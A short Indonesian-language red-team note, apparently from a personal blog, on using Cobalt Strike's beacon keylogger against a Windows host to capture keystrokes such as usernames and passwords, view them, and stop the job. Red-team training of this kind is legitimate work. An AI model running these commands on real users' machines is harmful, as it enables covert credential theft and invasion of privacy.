---
title: '[Windows] Keyloggers'
date: 2023-07-25 16:44:22 +0700
categories: ['Windows Hacking', 'Host Reconnaissance']
tags: [red team, host reconnaissance, windows hacking, cobalt strike, keylogger]     # TAG names should always be lowercase
author: nairpaa
---

**Keylogger** dapat merekaman *keystrokes* yang ditekan pengguna, yang sangat berguna untuk mendapatkan nama pengguna, kata sandi, dan informasi sensitif lainnya.

```bash
beacon> keylogger
```

Untuk melihat semua *keystrokes* yang sudah diambil, buka **View > Keystrokes**.

![Keylogger pada Cobalt Strike](/assets/img/posts/windows-keylogger/1.png){: w="650" h="550" }
_Keylogger pada Cobalt Strike_

Berikut contoh untuk mematikan proses `keylogger`:

```bash
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 6    0     keystroke logger

beacon> jobkill 6
```
